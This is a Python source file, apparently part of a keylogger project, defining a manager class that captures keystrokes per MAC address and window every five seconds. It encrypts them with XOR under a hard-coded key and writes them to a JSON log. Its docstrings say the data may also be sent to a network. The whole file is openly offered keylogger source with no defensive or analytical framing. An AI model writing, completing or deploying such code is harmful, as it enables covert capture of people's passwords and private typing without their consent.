import time
from KeyloggerAgent.Write import IWriter, FileWriter
from KeyloggerAgent.KeyloggerService import KeyLoggerService
from KeyloggerAgent.Encryption import XOREncryption




class KeyLoggerManager:

    def __init__(self):
        self.service = KeyLoggerService()
        self.writer = FileWriter()
        self.__encryption = XOREncryption('0988977872186763')

    def start_listening(self):
        """
        Starts listening and sends the values
        to be written to a json file or to a network
        """
        self.service.start_listening()
        print("Keylogger is starting!")
        while True:
            time.sleep(5)
            data = self.service.get_data()
            self._writer(self.writer , self.encrypt(data),'log.json')

    def stop_listening(self):
        """
         Stops listening to keyboard keys
        """
        self.service.stop_listening()

    def encrypt(self , data: dict) -> dict:
        """
        Takes an unencrypted dictionary
         and returns an encrypted dictionary
        """
        temp_dict = dict()
        for mac , user_dict in data.items():
            temp_dict[mac] = dict()
            for  window, data_dict in user_dict.items():
                temp_dict[mac][window] = dict()
                for timestamp ,data_keys in data_dict.items():
                     temp_dict[mac][window][timestamp]= self.__encryption.encrypt(data_keys)
        return temp_dict


    def decrypt(self):
        """
        Takes an encrypted json file
         and returns an unencrypted dictionary
        """
        temp_dict = dict()
        data = self.writer.load('log.json')
        for mac, user_dict in data.items():
            temp_dict[mac] = dict()
            for window, data_dict in user_dict.items():
                temp_dict[mac][window] = dict()
                for timestamp, data_keys in data_dict.items():
                    temp_dict[mac][window][timestamp] = self.__encryption.decrypt(data_keys)
        return temp_dict
    @staticmethod
    def _writer(write:IWriter, data:dict, name:str):
        """
        Writes text to a json file or to a network
        """
        write.write(data , name)

if __name__ == "__main__":
    keylogger = KeyLoggerManager()
    keylogger.start_listening()



